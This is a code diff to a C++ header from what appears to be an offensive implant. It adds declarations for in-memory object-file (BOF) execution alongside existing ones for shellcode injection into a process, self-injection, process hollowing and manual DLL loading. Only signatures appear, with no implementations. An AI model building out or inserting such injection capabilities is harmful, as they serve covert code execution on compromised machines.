@@ -15,6 +15,7 @@
 #define LURCH_IMAGE_NOT_AT_BASE 0x40000003L
 
 namespace tasking {
+    std::string execute_bof(const std::string& object_file, unsigned char* arguments, int argc);
     std::string run_shellcode(uint32_t pid, const std::string& shellcode_buffer);
     std::string simple_self_inject(void const* payload, uint32_t payload_size);
     std::string runexe(bool hollow, const std::string& file_buffer);
@@ -28,6 +29,14 @@ namespace tasking {
     bool handle_dll_relocations(dll_info* pdll_info);
     bool resolve_dll_imports(dll_info* pdll_info);
     bool fix_dll_memory_permissions(dll_info* pdll_info);
+
+    bool load_object(void* pobject, const std::string& func_name, unsigned char* arguments, uint32_t argc);
+    bool object_execute(object_context* ctx, const char* entry, unsigned char* args, const uint32_t argc);
+    void* resolve_object_symbol(const char* symbol);
+    void object_relocation(uint32_t type, void* needs_relocating, void* section_base);
+    bool process_object_sections(object_context* ctx);
+
+    uint32_t object_virtual_size(object_context* ctx);
 }
 
 #endif //INJECTION_HPP
